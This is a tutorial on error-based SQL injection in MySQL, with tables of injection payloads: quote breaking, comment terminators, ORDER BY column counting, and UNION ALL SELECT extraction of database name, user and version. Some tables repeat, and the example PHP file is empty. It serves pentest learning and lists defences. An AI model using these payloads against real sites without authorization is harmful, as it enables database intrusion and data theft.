# Error-Based SQL Injection

## What is Error-Based SQL Injection?

Error-based SQL injection is a type of in-band SQL injection where attackers cause the database to generate error messages containing valuable information about the database structure, version, or configuration. These SQL errors are returned by the application and used by attackers to craft further attacks.

### Key Characteristics:

- It exploits insecure dynamic SQL queries where user input is directly concatenated into SQL statements without sanitation or prepared statements.
- The error messages returned reveal hints like database version, query structure, table names, or column names.
- This attack is one of the easiest and most direct techniques because it uses the same communication channel to inject and retrieve data.

---

## How Error-Based SQL Injection Works

1. **Finding Vulnerable Parameter:** Attacker inputs a single quote `'` or malformed value that intentionally breaks SQL syntax.
    
2. **Triggering SQL Error:** The broken query causes the database to throw an error.
    
3. **Extracting Information:** Error messages disclose sensitive info such as the type of database, version, or query details.
    
4. **Further Exploitation:** Using this information attacker crafts injections like UNION-based queries to dump data.
    

### Example Error Message

```
You have an error in your SQL syntax; check the manual for the right syntax to use near '' at line 1
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given ...
```

This reveals the database is MySQL, suitable injection payloads can then be tailored.

---

## Techniques for Error-Based SQL Injection

### 1. Using Single Quotes `'` to Test Injection

Inject a single quote `1'` to cause syntax error. If error appears, the input is concatenated unsafely.

**Try logical payloads like:** To test whether the condition bypasses filters.

```sql
?id=1' OR '1'='1
```

---

### 2. Using SQL Comments to Modify Queries

- `%23` or `#` represent comments to ignore the rest of the query.
- `--+` is another comment style to safely terminate injected queries.

**Example:**

```sql
?id=1' --+
?id=1'%23
```

---

### 3. Detecting Number of Columns with `ORDER BY`

To craft UNION injections, knowing the number of columns returned by the original query helps:

- Inject `ORDER BY` with incremental column numbers.
- Query executes normally until the column index is out of bounds, causing error.
- Last successful index = number of columns.

**Example payload sequence:**

```sql
?id=1' ORDER BY 1--+
?id=1' ORDER BY 2--+
?id=1' ORDER BY 3--+
...
?id=1' ORDER BY N--+
```

**Column Index Table:**

|Column Index|URL Example|
|---|---|
|1|`... id=1' order by 1%23`|
|2|`... id=1' order by 2%23`|
|3|`... id=1' order by 3%23`|
|4|`... id=1' order by 4%23`|
|5|`... id=1' order by 5%23`|
|6|`... id=1' order by 6%23`|
|7|`... id=1' order by 7%23`|
|8|`... id=1' order by 8%23`|

Repeat using `--+` instead of `%23`. The last successful index (before an error) equals the total number of columns.

---

### 4. Extracting Data Using `UNION ALL SELECT`

Combine attacker-defined SELECT with original SELECT using `UNION ALL`.

- Number of columns and compatible datatypes must match original query.
- Injecting values like `1,2,3,...` helps identify which columns appear in output.

**Example:**

```sql
?id=1' UNION ALL SELECT 1,2,3,4,5 --+
```

If numbers appear, injection is successful.

---

### 5. Retrieve Database Metadata

Common functions to obtain useful database info:

|Function|Purpose|Example Injection|
|---|---|---|
|`database()`|Current database name|`UNION SELECT 1,database(),3, ...`|
|`current_user`|DB user executing query|`UNION SELECT 1,current_user,3, ...`|
|`@@version`|MySQL version|`UNION SELECT 1,@@version,3, ...`|

These injections help attackers learn target environment and develop tailored attacks.

---

## Summary Table of Main Techniques

|Technique|Description|Example Injection|
|---|---|---|
|Single Quote Injection|Cause syntax error to reveal DB details|`id=1'`|
|SQL Comment Injection|Comment out remainder of query|`id=1' --+` or `id=1'%23`|
|Logical Operator Injection|Modify WHERE clause to always true|`id=1' OR '1'='1`|
|Detect Columns (ORDER BY)|Determine number of columns in query|`id=1' ORDER BY 3--+`|
|Union Select Injection|Extract data by unioning attacker query|`id=1' UNION ALL SELECT 1,2,3,4,5--+`|
|Metadata Extraction|Use SQL functions to get DB info|`union select 1,current_user, ...`|

---

## Joining the Query

Comment and logic operators allow query manipulation.

|Technique|Example|Explanation|
|---|---|---|
|URL encoded comment|`id=1'%23` or `id=1'#`|Ends query early.|
|Logical OR|`id=1' or '1`|Forces true condition.|
|Logical OR|`id=1' or 1='1`|Same objective, numeric variant.|
|SQL comment|`id=1' --+`|Comments trailing SQL.|
|Encoded comment|`id=1'%20--+`|Encoded space then comment.|

These payloads illustrate how logic modification and commenting manipulate query outcomes.

---

## Running Multiple SELECT Statements (UNION ALL)

Combine multiple query results using `UNION ALL SELECT`:

|Example URL|Description|
|---|---|
|`id=1' union all select 1,2,3,4,5,6,7 --+`|Combines fake data with results.|
|`id=-1' union all select 1,2,3,4,5,6,7 --+`|Uses false record to inject.|
|`id=999999' union all select 1,2,3,4,5,6,7 --+`|Confirms injection success.|
|`id=admin' union all select 1,2,3,4,5,6,7 --+`|String-based confirmation.|

---

## Important Security Notes

- **Always perform such tests on authorized systems only.**
- **Protect applications against these injection types by using parameterized queries and prepared statements.**
- **Disable verbose error messages in production environments.**
- **Employ web application firewalls and input validation.**

These detailed insights deepen understanding of how error-based SQL injection is detected, exploited, and how information is enumerated by attackers to compromise databases.

---

## Example Files

### error-based-string.php

```php
<?php
```

**Barrack the Query Using `'` (Single Quote)**

Testing injection with a single quote can confirm SQL vulnerability:

```
http://192.168.1.31/web-pentest/error-based-string.php?id=1'
```

If an SQL syntax error appears, it confirms unsanitized query insertion.

**Deeper testing payload:**

```sql
?id=1' OR '1'='1
```

Returns all records if vulnerable.

---

## Finding the Number of Columns (ORDER BY)

Incrementally test `ORDER BY` values to find table column count.

**Detailed Column Testing Table:**

|Column Index|URL Example|
|---|---|
|1|`... id=1' order by 1%23`|
|2|`... id=1' order by 2%23`|
|3|`... id=1' order by 3%23`|
|4|`... id=1' order by 4%23`|
|5|`... id=1' order by 5%23`|
|6|`... id=1' order by 6%23`|
|7|`... id=1' order by 7%23`|
|8|`... id=1' order by 8%23`|

Repeat using `--+` instead of `%23`. The last successful index (before an error) equals the total number of columns.

---

## Running Multiple SELECT Statements (UNION ALL) - Detailed

Combine multiple query results using `UNION ALL SELECT`:

### Example URLs and Descriptions

|Example URL|Description|
|---|---|
|`id=1' union all select 1,2,3,4,5,6,7 --+`|Combines fake data with results.|
|`id=-1' union all select 1,2,3,4,5,6,7 --+`|Uses false record to inject.|
|`id=999999' union all select 1,2,3,4,5,6,7 --+`|Confirms injection success.|
|`id=admin' union all select 1,2,3,4,5,6,7 --+`|String-based confirmation.|

### How UNION Injections Work

Union-based queries allow attackers to retrieve database metadata by running their SELECT statements alongside legitimate ones. The attacker crafts queries that match column count and compatible data types to successfully execute arbitrary SQL commands.

**If injection succeeds, columns display test numbers, revealing output columns for exploitation.**

---

## Extract Database Information Using UNION ALL SELECT

|Target|Example URL|Function Used|
|---|---|---|
|Database name|`id=-1' union all select 1,database(),3,4,5,6,7 --+`|Reveals DB name|
|User name|`id=-1' union all select 1,current_user,3,4,5,6,7 --+`|Reveals DB user|
|Version info|`id=-1' union all select 1,@@version,3,4,5,6,7 --+`|Reveals DB version|

Each payload replaces one column to display sensitive metadata from the backend server environment.